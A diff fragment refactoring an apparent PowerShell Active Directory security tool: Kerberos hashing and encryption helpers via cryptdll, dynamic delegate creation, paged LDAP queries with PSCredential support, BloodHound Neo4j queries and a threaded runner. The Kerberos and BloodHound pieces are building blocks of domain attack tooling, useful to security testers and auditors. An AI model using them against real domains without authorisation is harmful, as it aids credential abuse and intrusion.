+    $KerbEcryptHashPassword = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.HashPassword, $KerbEcryptHashPasswordDelegate)
     $status = $KerbEcryptHashPassword.Invoke($passwordUnicode, $saltUnicode, $Count, $output)
     if ($status -ne 0) {
         throw New-Object ComponentModel.Win32Exception -ArgumentList ($status)
@@ -795,7 +845,7 @@ function Local:KerberosPasswordHash {
     return $output
 }
 
-function Local:KerberosEncrypt {
+Function Local:KerberosEncrypt {
     [CmdletBinding()]
     param ( 
         [parameter(Mandatory=$true)]
@@ -817,13 +867,13 @@ function Local:KerberosEncrypt {
 
     $KERB_ECRYPT = [Win32+KERB_ECRYPT]
 
-    $kerbEcryptSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$KERB_ECRYPT)
-    $pCSystemPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($kerbEcryptSize)
+    $kerbEcryptSize = [Runtime.InteropServices.Marshal]::SizeOf([Type]$KERB_ECRYPT)
+    $pCSystemPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($kerbEcryptSize)
     $status = [Win32]::CDLocateCSystem($eType, [ref]$pCSystemPtr)
     if ($status -ne 0) {
         throw New-Object ComponentModel.Win32Exception -ArgumentList ($status, "Error on CDLocateCSystem")
     }
-    $pCSystem = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pCSystemPtr, [Type]$KERB_ECRYPT)
+    $pCSystem = [Runtime.InteropServices.Marshal]::PtrToStructure($pCSystemPtr, [Type]$KERB_ECRYPT)
 
     $outputSize = $data.Length
     if($data.Length % $pCSystem.BlockSize -ne 0) {
@@ -834,24 +884,24 @@ function Local:KerberosEncrypt {
 
     $pContext = [IntPtr]::Zero
     $KerbEcryptInitializeDelegate = Get-DelegateType @([byte[]], [int], [int], [IntPtr].MakeByRefType()) ([int])
-    $KerbEcryptInitialize = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.Initialize, $KerbEcryptInitializeDelegate)
+    $KerbEcryptInitialize = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.Initialize, $KerbEcryptInitializeDelegate)
     $status = $KerbEcryptInitialize.Invoke($key, $key.Length, $keyUsage, [ref]$pContext)
     if ($status -ne 0) {
         throw New-Object ComponentModel.Win32Exception -ArgumentList ($status)
     }
 
     $KerbEcryptEncryptDelegate = Get-DelegateType @([IntPtr], [byte[]], [int], [byte[]], [IntPtr].MakeByRefType()) ([int])
-    $KerbEcryptEncrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.Encrypt, $KerbEcryptEncryptDelegate)
+    $KerbEcryptEncrypt = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.Encrypt, $KerbEcryptEncryptDelegate)
     $KerbEcryptEncrypt.Invoke($pContext, $data, $data.Length, $output, [ref]$outputSize) | Out-Null
 
     $KerbEcryptFinishDelegate = Get-DelegateType @([IntPtr].MakeByRefType()) ([int])
-    $KerbEcryptFinish = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.Finish, $KerbEcryptFinishDelegate)
+    $KerbEcryptFinish = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.Finish, $KerbEcryptFinishDelegate)
     $KerbEcryptFinish.Invoke([ref]$pContext) | Out-Null
 
     return $output
 }
 
-function Local:Get-LdapObject {
+Function Local:Get-LdapObject {
     Param (
         [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
@@ -874,19 +924,18 @@ function Local:Get-LdapObject {
         [Int]
         $PageSize = 200,
 
-        [String]
-        $LdapUser,
-
-        [String]
-        $LdapPass
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
 
-    if ($LdapUser) {
-        $domainObject = New-Object System.DirectoryServices.DirectoryEntry($ADSpath, $LdapUser, $LdapPass)
-        $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainObject)
+    if ($Credential.UserName) {
+        $domainObject = New-Object DirectoryServices.DirectoryEntry($ADSpath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
+        $searcher = New-Object DirectoryServices.DirectorySearcher($domainObject)
     }
     else {
-        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$ADSpath)
+        $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$ADSpath)
     }
     $searcher.SearchScope = $SearchScope
     $searcher.PageSize = $PageSize
@@ -894,13 +943,13 @@ function Local:Get-LdapObject {
     $searcher.filter = $Filter
     $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
     $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
-    Try {
+    try {
         $results = $searcher.FindAll()
         $results | Where-Object {$_} | ForEach-Object {
             $objectProperties = @{}
             $p = $_.Properties
             $p.PropertyNames | ForEach-Object {
-                if (($_ -ne 'adspath') -And ($p[$_].count -eq 1)) {
+                if (($_ -ne 'adspath') -and ($p[$_].count -eq 1)) {
                     $objectProperties[$_] = $p[$_][0]
                 }
                 elseif ($_ -ne 'adspath') {
@@ -911,12 +960,13 @@ function Local:Get-LdapObject {
         }
         $results.dispose()
         $searcher.dispose()
-    } Catch {
+    }
+    catch {
         Write-Error $_ -ErrorAction Stop
     }
 }
 
-function Local:New-BloodHoundQuery {
+Function Local:New-BloodHoundQuery {
     [CmdletBinding()]
     Param(
         [ValidateNotNullOrEmpty()]
@@ -932,9 +982,9 @@ function Local:New-BloodHoundQuery {
         $Query,
 
         [ValidateNotNullOrEmpty()]
-        [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]
-        $Credential = [System.Management.Automation.PSCredential]::Empty
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
 
     $Uri = "http://$($Neo4jHost):$($Neo4jPort)/db/data/cypher"
@@ -946,16 +996,16 @@ function Local:New-BloodHoundQuery {
     }
 }
 
-function Local:New-ThreadedFunction {
+Function Local:New-ThreadedFunction {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
-        [System.Array]
+        [Parameter(Mandatory = $True)]
+        [Array]
         $Collection,
 
         [Parameter(Mandatory = $True)]
-        [System.Management.Automation.ScriptBlock]
+        [Management.Automation.ScriptBlock]
         $ScriptBlock,
 
         [Hashtable]
@@ -970,8 +1020,8 @@ function Local:New-ThreadedFunction {
     )
 
     BEGIN {
-        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
-        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
+        $SessionState = [Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
+        $SessionState.ApartmentState = [Threading.Thread]::CurrentThread.GetApartmentState()
 
         # Import the current session state's variables and functions so the chained functionality can be used by the threaded blocks
         if (-not $NoImports) {
@@ -982,15 +1032,15 @@ function Local:New-ThreadedFunction {
             $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
 
             # Add variables from Parent Scope (current runspace) into the InitialSessionState
-            ForEach ($Var in $MyVars) {
+            foreach ($Var in $MyVars) {
                 if ($VorbiddenVars -NotContains $Var.Name) {
-                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
+                    $SessionState.Variables.Add((New-Object -TypeName Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                 }
             }
 
             # Add functions from current runspace to the InitialSessionState
-            ForEach ($Function in (Get-ChildItem Function:)) {
-                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
+            foreach ($Function in (Get-ChildItem Function:)) {
+                $SessionState.Commands.Add((New-Object -TypeName Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
             }
         }
 
@@ -999,8 +1049,8 @@ function Local:New-ThreadedFunction {
         $Pool.Open()
 
         # Get the proper BeginInvoke() method that allows for an output queue
-        $Method = $Null
-        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
+        $Method = $null
+        foreach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
             $MethodParameters = $M.GetParameters()
             if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {
                 $Method = $M.MakeGenericMethod([Object], [Object])
@@ -1010,7 +1060,7 @@ function Local:New-ThreadedFunction {
 
         $Jobs = @()
         $Collection = $Collection | Where-Object {$_}
-        Write-Verbose "[New-ThreadedFunction] Total number of elements in collection: $($Collection.Count)"
+        Write-Verbose "[THREAD] Processing $($Collection.Count) elements with $Threads threads."
 
         # Partition collection into $Threads number of groups
         if ($Threads -ge $Collection.Count) {
@@ -1022,7 +1072,7 @@ function Local:New-ThreadedFunction {
         $End = $ElementSplitSize
 
         for($i = 1; $i -le $Threads; $i++) {
-            $List = New-Object System.Collections.ArrayList
+            $List = New-Object Collections.ArrayList
             if ($i -eq $Threads) {
                 $End = $Collection.Count
             }
@@ -1032,18 +1082,18 @@ function Local:New-ThreadedFunction {
             $CollectionPartitioned += @(,@($List.ToArray()))
         }
 
-        Write-Verbose "[New-ThreadedFunction] Total number of threads/partitions: $Threads"
+        Write-Verbose "[THREAD] Total number of threads/partitions: $Threads"
 
-        ForEach ($CollectionPartition in $CollectionPartitioned) {
+        foreach ($CollectionPartition in $CollectionPartitioned) {
             # Create a "powershell pipeline runner"
             $PowerShell = [PowerShell]::Create()
             $PowerShell.runspacepool = $Pool
 
             # Add the script block and arguments
-            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter('Collection', $CollectionPartition)
+            $null = $PowerShell.AddScript($ScriptBlock).AddParameter('Collection', $CollectionPartition)
             if ($ScriptParameters) {
-                ForEach ($Param in $ScriptParameters.GetEnumerator()) {
-                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
+                foreach ($Param in $ScriptParameters.GetEnumerator()) {
+                    $null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                 }
             }
 
@@ -1054,39 +1104,41 @@ function Local:New-ThreadedFunction {
             $Jobs += @{
                 PS = $PowerShell
                 Output = $Output
-                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
+                Result = $Method.Invoke($PowerShell, @($null, [Management.Automation.PSDataCollection[Object]]$Output))
             }
         }
     }
 
     END {
-        Write-Verbose "[New-ThreadedFunction] Threads executing"
+        Write-Verbose "[THREAD] Threads executing"
 
         # Continuously loop through each job queue, consuming output as appropriate
-        Do {
-            ForEach ($Job in $Jobs) {
+        do {
+            foreach ($Job in $Jobs) {
                 $Job.Output.ReadAll()
             }
             Start-Sleep -Seconds 1
         }
-        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
+        while (($Jobs | Where-Object {-not $_.Result.IsCompleted}).Count -gt 0)
+
+        $SleepSeconds = 10
+        Write-Verbose "[THREAD] Waiting $SleepSeconds seconds for final cleanup..."
 
         # Cleanup
-        $SleepSeconds = 2
-        Write-Verbose "[New-ThreadedFunction] Waiting $SleepSeconds seconds for final cleanup..."
         for ($i=0; $i -lt $SleepSeconds; $i++) {
-            ForEach ($Job in $Jobs) {
+            foreach ($Job in $Jobs) {
                 $Job.Output.ReadAll()
                 $Job.PS.Dispose()
             }
-            Start-Sleep -S 1
+            Start-Sleep -Seconds 1
         }
+
         $Pool.Dispose()
-        Write-Verbose "[New-ThreadedFunction] all threads completed"
+        Write-Verbose "[THREAD] all threads completed"
     }
 }
 
-function Local:Get-DelegateType {
+Function Local:Get-DelegateType {
     Param (
         [OutputType([Type])]
 
@@ -1100,11 +1152,11 @@ function Local:Get-DelegateType {
     )
 
     $Domain = [AppDomain]::CurrentDomain
-    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
-    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
     $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
-    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [MulticastDelegate])
+    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [Reflection.CallingConventions]::Standard, $Parameters)
     $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
     $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
     $MethodBuilder.SetImplementationFlags('Runtime, Managed')
